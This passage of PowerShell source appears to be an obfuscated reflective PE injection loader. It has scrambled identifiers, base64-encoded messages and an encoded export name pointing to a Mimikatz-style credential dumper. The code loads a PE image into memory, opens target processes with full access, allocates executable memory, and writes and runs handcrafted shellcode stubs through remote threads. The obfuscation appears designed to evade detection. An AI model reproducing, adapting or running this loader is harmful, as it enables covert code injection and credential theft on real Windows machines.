		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGQAZQB0AGEAaQBsAGUAZAAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGgAZQBhAGQAZQByAHMAIABsAG8AYQBkAGUAZAAgAGkAbgAgAG0AZQBtAG8AcgB5AA==')))
		${__/\/=\/\_/=\_/=\_} = __/\_/\/\/==\___/\ -__/\/\/==\_/=\/\/= ${__/\/\/==\_/=\/\/=} -Win32Types $Win32Types -Win32Constants $Win32Constants
		${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name EndAddress -Value ${___/\/\/=\_/\____}
		${__/\/=\/\_/=\_/=\_} | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value ${_/==\/\/\___/\/==}
		Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AEEAZABkAHIAZQBzAHMAOgAgACQAewBfAF8ALwBcAC8AXAAvAD0APQBcAF8ALwA9AFwALwBcAC8APQB9ACAAIAAgACAARQBuAGQAQQBkAGQAcgBlAHMAcwA6ACAAJAB7AF8AXwBfAC8AXAAvAFwALwA9AFwAXwAvAFwAXwBfAF8AXwB9AA==')))
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAgAFAARQAgAHMAZQBjAHQAaQBvAG4AcwAgAGkAbgAgAHQAbwAgAG0AZQBtAG8AcgB5AA==')))
		___/\_/\_/\/==\__/ -_/========\__/\/== ${_/========\__/\/==} -__/\/=\/\_/=\_/=\_ ${__/\/=\/\_/=\_/=\_} -Win32Functions $Win32Functions -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGEAZABkAHIAZQBzAHMAZQBzACAAYgBhAHMAZQBkACAAbwBuACAAdwBoAGUAcgBlACAAdABoAGUAIABQAEUAIAB3AGEAcwAgAGEAYwB0AHUAYQBsAGwAeQAgAGwAbwBhAGQAZQBkACAAaQBuACAAbQBlAG0AbwByAHkA')))
		__/\_/===\/=\__/== -__/\/=\/\_/=\_/=\_ ${__/\/=\/\_/=\_/=\_} -_/=\__/\/=\__/\_/\ ${_/=\__/\/=\__/\_/\} -Win32Constants $Win32Constants -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAIABEAEwATAAnAHMAIABuAGUAZQBkAGUAZAAgAGIAeQAgAHQAaABlACAAUABFACAAdwBlACAAYQByAGUAIABsAG8AYQBkAGkAbgBnAA==')))
		if (${_____/\_/==\_____} -eq $true)
		{
			_/=\/\_/=\__/\/=== -__/\/=\/\_/=\_/=\_ ${__/\/=\/\_/=\_/=\_} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -__/\____/\/===\_/\ ${__/\____/\/===\_/\}
		}
		else
		{
			_/=\/\_/=\__/\/=== -__/\/=\/\_/=\_/=\_ ${__/\/=\/\_/=\_/=\_} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		if (${_____/\_/==\_____} -eq $false)
		{
			if (${/=\_/\____/====\/} -eq $true)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAHAAcgBvAHQAZQBjAHQAaQBvAG4AIABmAGwAYQBnAHMA')))
				___/=\_____/=\/=\/ -__/\/=\/\_/=\_/=\_ ${__/\/=\/\_/=\_/=\_} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAcgBlAGYAbABlAGMAdABpAHYAZQBsAHkAIABsAG8AYQBkAGUAZAAgAGkAcwAgAG4AbwB0ACAAYwBvAG0AcABhAHQAaQBiAGwAZQAgAHcAaQB0AGgAIABOAFgAIABtAGUAbQBvAHIAeQAsACAAawBlAGUAcABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAYQBzACAAcgBlAGEAZAAgAHcAcgBpAHQAZQAgAGUAeABlAGMAdQB0AGUA')))
			}
		}
		else
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAbABvAGEAZABlAGQAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACwAIABuAG8AdAAgAGEAZABqAHUAcwB0AGkAbgBnACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMA')))
		}
		if (${_____/\_/==\_____} -eq $true)
		{
			[UInt32]${_/=\/====\/===\/=} = 0
			${_/\/=\_/\/===\__/} = $Win32Functions.WriteProcessMemory.Invoke(${__/\____/\/===\_/\}, ${_/==\/\/\___/\/==}, ${__/\/\/==\_/=\/\/=}, [UIntPtr](${__/\/=\/\_/=\_/=\_}.SizeOfImage), [Ref]${_/=\/====\/===\/=})
			if (${_/\/=\_/\/===\__/} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
		}
		if (${__/\/=\/\_/=\_/=\_}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			if (${_____/\_/==\_____} -eq $false)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaABhAHMAIABiAGUAZQBuACAAbABvAGEAZABlAGQA')))
				${____/\/====\_/\/\} = _/=\___/\_/\__/\/\ (${__/\/=\/\_/=\_/=\_}.PEHandle) (${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				${/===\/=\___/\__/=} = __/==\_/\/\_/\_/== @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${_/\_/=\/===\/=\__} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${____/\/====\_/\/\}, ${/===\/=\___/\__/=})
				${_/\_/=\/===\/=\__}.Invoke(${__/\/=\/\_/=\_/=\_}.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				${____/\/====\_/\/\} = _/=\___/\_/\__/\/\ (${_/==\/\/\___/\/==}) (${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				if (${__/\/=\/\_/=\_/=\_}.PE64Bit -eq $true)
				{
					${/===\/\/\_/===\_/} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${__/\/\___/==\_/==} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${___/\___/\______/} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					${/===\/\/\_/===\_/} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${__/\/\___/==\_/==} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${___/\___/\______/} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${_/\_/\/==\__/\_/\} = ${/===\/\/\_/===\_/}.Length + ${__/\/\___/==\_/==}.Length + ${___/\___/\______/}.Length + (${_/=\__/=\/=\_/=\/} * 2)
				${_/\_/=\/==\_/==\_} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/\_/\/==\__/\_/\})
				${_______________/\} = ${_/\_/=\/==\_/==\_}
				_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${/===\/\/\_/===\_/} -___/\/====\_/\_/== ${_/\_/=\/==\_/==\_}
				${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${/===\/\/\_/===\_/}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/==\/\/\___/\/==}, ${_/\_/=\/==\_/==\_}, $false)
				${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/=\__/=\/=\_/=\/})
				_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${__/\/\___/==\_/==} -___/\/====\_/\_/== ${_/\_/=\/==\_/==\_}
				${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${__/\/\___/==\_/==}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${____/\/====\_/\/\}, ${_/\_/=\/==\_/==\_}, $false)
				${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${_/=\__/=\/=\_/=\/})
				_/=\_/====\_/\_/\/ -__/==\/\_/\_/\/=\/ ${___/\___/\______/} -___/\/====\_/\_/== ${_/\_/=\/==\_/==\_}
				${_/\_/=\/==\_/==\_} = _/=\___/\_/\__/\/\ ${_/\_/=\/==\_/==\_} (${___/\___/\______/}.Length)
				${/===\___/\__/==\_} = $Win32Functions.VirtualAllocEx.Invoke(${__/\____/\/===\_/\}, [IntPtr]::Zero, [UIntPtr][UInt64]${_/\_/\/==\__/\_/\}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if (${/===\___/\__/==\_} -eq [IntPtr]::Zero)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
				}
				${_/\/=\_/\/===\__/} = $Win32Functions.WriteProcessMemory.Invoke(${__/\____/\/===\_/\}, ${/===\___/\__/==\_}, ${_______________/\}, [UIntPtr][UInt64]${_/\_/\/==\__/\_/\}, [Ref]${_/=\/====\/===\/=})
				if ((${_/\/=\_/\/===\__/} -eq $false) -or ([UInt64]${_/=\/====\/===\/=} -ne [UInt64]${_/\_/\/==\__/\_/\}))
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
				}
				${_/\/====\_/==\/\_} = _/=\__/=\/==\/===\ -__/=\__/=\/=\_/\_/ ${__/\____/\/===\_/\} -____/=\_/=\_/\_/\_ ${/===\___/\__/==\_} -Win32Functions $Win32Functions 
				${/====\__/==\__/==} = $Win32Functions.WaitForSingleObject.Invoke(${_/\/====\_/==\/\_}, 20000)
				if (${/====\__/==\__/==} -ne 0)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
				}
				$Win32Functions.VirtualFreeEx.Invoke(${__/\____/\/===\_/\}, ${/===\___/\__/==\_}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif (${__/\/=\/\_/=\_/=\_}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA'))))
		{
			[IntPtr]${_/=\_/==\_/\/\/\/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte(${_/=\_/==\_/\/\/\/=}, 0, 0x00)
			${/=\/\__/===\/\/==} = ____/=\_____/\/\_/ -__/\/=\/\_/=\_/=\_ ${__/\/=\/\_/=\_/=\_} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -__/\/===\/\/\___/\ ${_____/==\____/\/=\} -_/=\_/==\_/\/\/\/= ${_/=\_/==\_/\/\/\/=}
			[IntPtr]${/=\__/\__/===\/=\} = _/=\___/\_/\__/\/\ (${__/\/=\/\_/=\_/=\_}.PEHandle) (${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAEUAWABFACAATQBhAGkAbgAgAGYAdQBuAGMAdABpAG8AbgAuACAAQQBkAGQAcgBlAHMAcwA6ACAAJAB7AC8APQBcAF8AXwAvAFwAXwBfAC8APQA9AD0AXAAvAD0AXAB9AC4AIABDAHIAZQBhAHQAaQBuAGcAIAB0AGgAcgBlAGEAZAAgAGYAbwByACAAdABoAGUAIABFAFgARQAgAHQAbwAgAHIAdQBuACAAaQBuAC4A')))
			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, ${/=\__/\__/===\/=\}, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]${___/\/=\/\__/====} = [System.Runtime.InteropServices.Marshal]::ReadByte(${_/=\_/==\_/\/\/\/=}, 0)
				if (${___/\/=\/\__/====} -eq 1)
				{
					__/====\_/\/==\___ -_/==\____/==\__/== ${/=\/\__/===\/\/==} -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAIAB0AGgAcgBlAGEAZAAgAGgAYQBzACAAYwBvAG0AcABsAGUAdABlAGQALgA=')))
					break
				}
				else
				{
					sleep -Seconds 1
				}
			}
		}
		return @(${__/\/=\/\_/=\_/=\_}.PEHandle, ${_/==\/\/\___/\/==})
	}
	Function __/\/=\/\/====\_/=
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/\/\/==\_/=\/\/=}
		)
		$Win32Constants = __/=\/==\_/==\/=\/
		$Win32Functions = _/=\/===\/\/\/\___
		$Win32Types = __/\_/====\/=\__/=
		${__/\/=\/\_/=\_/=\_} = __/\_/\/\/==\___/\ -__/\/\/==\_/=\/\/= ${__/\/\/==\_/=\/\/=} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${/======\_/\/\___/} = _/=\___/\_/\__/\/\ ([Int64]${__/\/=\/\_/=\_/=\_}.PEHandle) ([Int64]${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${_/\_/=\/==\_/=\/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/======\_/\/\___/}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${_/\_/=\/==\_/=\/\}.Characteristics -eq 0 `
						-and ${_/\_/=\/==\_/=\/\}.FirstThunk -eq 0 `
						-and ${_/\_/=\/==\_/=\/\}.ForwarderChain -eq 0 `
						-and ${_/\_/=\/==\_/=\/\}.Name -eq 0 `
						-and ${_/\_/=\/==\_/=\/\}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAHUAbgBsAG8AYQBkAGkAbgBnACAAdABoAGUAIABsAGkAYgByAGEAcgBpAGUAcwAgAG4AZQBlAGQAZQBkACAAYgB5ACAAdABoAGUAIABQAEUA')))
					break
				}
				${__/==\/\_/\/=\/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((_/=\___/\_/\__/\/\ ([Int64]${__/\/=\/\_/=\_/=\_}.PEHandle) ([Int64]${_/\_/=\/==\_/=\/\}.Name)))
				${/==\_/=\_/==\/\_/} = $Win32Functions.GetModuleHandle.Invoke(${__/==\/\_/\/=\/=\})
				if (${/==\_/=\_/==\/\_/} -eq $null)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZwBlAHQAdABpAG4AZwAgAEQATABMACAAaABhAG4AZABsAGUAIABpAG4AIABNAGUAbQBvAHIAeQBGAHIAZQBlAEwAaQBiAHIAYQByAHkALAAgAEQATABMAE4AYQBtAGUAOgAgACQAewBfAF8ALwA9AD0AXAAvAFwAXwAvAFwALwA9AFwALwA9AFwAfQAuACAAQwBvAG4AdABpAG4AdQBpAG4AZwAgAGEAbgB5AHcAYQB5AHMA'))) -WarningAction Continue
				}
				${_/\/=\_/\/===\__/} = $Win32Functions.FreeLibrary.Invoke(${/==\_/=\_/==\/\_/})
				if (${_/\/=\_/\/===\__/} -eq $false)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABmAHIAZQBlACAAbABpAGIAcgBhAHIAeQA6ACAAJAB7AF8AXwAvAD0APQBcAC8AXABfAC8AXAAvAD0AXAAvAD0AXAB9AC4AIABDAG8AbgB0AGkAbgB1AGkAbgBnACAAYQBuAHkAdwBhAHkAcwAuAA=='))) -WarningAction Continue
				}
				${/======\_/\/\___/} = _/=\___/\_/\__/\/\ (${/======\_/\/\___/}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaQBzACAAYgBlAGkAbgBnACAAdQBuAGwAbwBhAGQAZQBkAA==')))
		${____/\/====\_/\/\} = _/=\___/\_/\__/\/\ (${__/\/=\/\_/=\_/=\_}.PEHandle) (${__/\/=\/\_/=\_/=\_}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		${/===\/=\___/\__/=} = __/==\_/\/\_/\_/== @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${_/\_/=\/===\/=\__} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${____/\/====\_/\/\}, ${/===\/=\___/\__/=})
		${_/\_/=\/===\/=\__}.Invoke(${__/\/=\/\_/=\_/=\_}.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		${_/\/=\_/\/===\__/} = $Win32Functions.VirtualFree.Invoke(${__/\/\/==\_/=\/\/=}, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if (${_/\/=\_/\/===\__/} -eq $false)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
		}
	}
	Function ____/\/=\__/\_/=\_
	{
		$Win32Functions = _/=\/===\/\/\/\___
		$Win32Types = __/\_/====\/=\__/=
		$Win32Constants =  __/=\/==\_/==\/=\/
		${__/\____/\/===\_/\} = [IntPtr]::Zero
		if ((${/=\/\/\__/\___/=\} -ne $null) -and (${/=\/\/\__/\___/=\} -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAcwB1AHAAcABsAHkAIABhACAAUAByAG8AYwBJAGQAIABhAG4AZAAgAFAAcgBvAGMATgBhAG0AZQAsACAAYwBoAG8AbwBzAGUAIABvAG4AZQAgAG8AcgAgAHQAaABlACAAbwB0AGgAZQByAA==')))
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			${/==\_/=\____/==\_} = @(ps -Name $ProcName -ErrorAction SilentlyContinue)
			if (${/==\_/=\____/==\_}.Count -eq 0)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAZgBpAG4AZAAgAHAAcgBvAGMAZQBzAHMAIAAkAFAAcgBvAGMATgBhAG0AZQA=')))
			}
			elseif (${/==\_/=\____/==\_}.Count -gt 1)
			{
				${/==\__/\_/\_/===\} = ps | where { $_.Name -eq $ProcName } | select ProcessName, Id, SessionId
				echo ${/==\__/\_/\_/===\}
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAHQAaABhAG4AIABvAG4AZQAgAGkAbgBzAHQAYQBuAGMAZQAgAG8AZgAgACQAUAByAG8AYwBOAGEAbQBlACAAZgBvAHUAbgBkACwAIABwAGwAZQBhAHMAZQAgAHMAcABlAGMAaQBmAHkAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABJAEQAIAB0AG8AIABpAG4AagBlAGMAdAAgAGkAbgAgAHQAbwAuAA==')))
			}
			else
			{
				${/=\/\/\__/\___/=\} = ${/==\_/=\____/==\_}[0].ID
			}
		}
		if ((${/=\/\/\__/\___/=\} -ne $null) -and (${/=\/\/\__/\___/=\} -ne 0))
		{
			${__/\____/\/===\_/\} = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, ${/=\/\/\__/\___/=\})
			if (${__/\____/\/===\_/\} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbwBiAHQAYQBpAG4AIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIABwAHIAbwBjAGUAcwBzACAASQBEADoAIAAkAHsALwA9AFwALwBcAC8AXABfAF8ALwBcAF8AXwBfAC8APQBcAH0A')))
			}
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBvAHQAIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwAgAGkAbgBqAGUAYwB0ACAAaQBuACAAdABvAA==')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAEkAbgB2AG8AawBlAC0ATQBlAG0AbwByAHkATABvAGEAZABMAGkAYgByAGEAcgB5AA==')))
        try
        {
            ${_/\_/\_/=\_/=\/==} = gwmi -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if (${_/\_/\_/=\_/=\/==} -is [array])
        {
            ${_/\/==\__/\___/\/} = ${_/\_/\_/=\_/=\/==}[0]
        } else {
            ${_/\/==\__/\___/\/} = ${_/\_/\_/=\_/=\/==}
        }
        if ( ( ${_/\/==\__/\___/\/}.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUAOgAgAA=='))) + ${_/\/==\__/\___/\/}.AddressWidth + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABQAHIAbwBjAGUAcwBzADoAIAA='))) + ([System.IntPtr]::Size * 8))
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAGEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlACAAKAAzADIAYgBpAHQALwA2ADQAYgBpAHQAKQAgAGQAbwBlAHMAbgAnAHQAIABtAGEAdABjAGgAIABPAFMAIABhAHIAYwBoAGkAdABlAGMAdAB1AHIAZQAuACAANgA0AGIAaQB0ACAAUABTACAAbQB1AHMAdAAgAGIAZQAgAHUAcwBlAGQAIABvAG4AIABhACAANgA0AGIAaQB0ACAATwBTAC4A'))) -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]${_/========\__/\/==} = [Byte[]][Convert]::FromBase64String(${/\____/\___/\_/\/})
        }
        else
        {
            [Byte[]]${_/========\__/\/==} = [Byte[]][Convert]::FromBase64String(${_/\_/\_/\/====\/=})
        }
        ${_/========\__/\/==}[0] = 0
        ${_/========\__/\/==}[1] = 0
		${__/\/\/==\_/=\/\/=} = [IntPtr]::Zero
		if (${__/\____/\/===\_/\} -eq [IntPtr]::Zero)
		{
			${_/=\_/=\/=\_/\_/\} = __/\/===\____/\/=\ -_/========\__/\/== ${_/========\__/\/==} -_____/==\____/\/=\ ${_____/==\____/\/=\}
		}
		else
		{
			${_/=\_/=\/=\_/\_/\} = __/\/===\____/\/=\ -_/========\__/\/== ${_/========\__/\/==} -_____/==\____/\/=\ ${_____/==\____/\/=\} -__/\____/\/===\_/\ ${__/\____/\/===\_/\}
		}
		if (${_/=\_/=\/=\_/\_/\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABsAG8AYQBkACAAUABFACwAIABoAGEAbgBkAGwAZQAgAHIAZQB0AHUAcgBuAGUAZAAgAGkAcwAgAE4AVQBMAEwA')))
		}
		${__/\/\/==\_/=\/\/=} = ${_/=\_/=\/=\_/\_/\}[0]
		${_/==\___/====\/\/} = ${_/=\_/=\/=\_/\_/\}[1] 
		${__/\/=\/\_/=\_/=\_} = __/\_/\/\/==\___/\ -__/\/\/==\_/=\/\/= ${__/\/\/==\_/=\/\/=} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if ((${__/\/=\/\_/=\_/=\_}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${__/\____/\/===\_/\} -eq [IntPtr]::Zero))
		{
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABXAFMAdAByAGkAbgBnACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]${/==\/\/==\/\/\/==} = _/==\/\__/\__/==== -__/\/\/==\_/=\/\/= ${__/\/\/==\_/=\/\/=} -___/==\_/\/\_/\_/= $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABvAHcAZQByAHMAaABlAGwAbABfAHIAZQBmAGwAZQBjAHQAaQB2AGUAXwBtAGkAbQBpAGsAYQB0AHoA')))
				    if (${/==\/\/==\/\/\/==} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${__/\/==\_/\__/\/\} = __/==\_/\/\_/\_/== @([IntPtr]) ([IntPtr])
				    ${_/===\_/\/\/==\/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\/\/==\/\/\/==}, ${__/\/==\_/\__/\/\})
                    ${___/=\/==\/\/\_/\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${_____/==\____/\/=\})
				    [IntPtr]${/=\__/=\/=\/\/\_/} = ${_/===\_/\/\/==\/=}.Invoke(${___/=\/==\/\/\_/\})
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${___/=\/==\/\/\_/\})
				    if (${/=\__/=\/=\/\/\_/} -eq [IntPtr]::Zero)
				    {
				    	Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAG8AdQB0AHAAdQB0ACwAIABPAHUAdABwAHUAdAAgAFAAdAByACAAaQBzACAATgBVAEwATAA=')))
				    }
				    else
				    {
				        ${___/\_/=\_/\/====} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${/=\__/=\/=\/\/\_/})
				        echo ${___/\_/=\_/\/====}
				        $Win32Functions.LocalFree.Invoke(${/=\__/=\/=\/\/\_/});
				    }
		}
		elseif ((${__/\/=\/\_/=\_/=\_}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${__/\____/\/===\_/\} -ne [IntPtr]::Zero))
		{
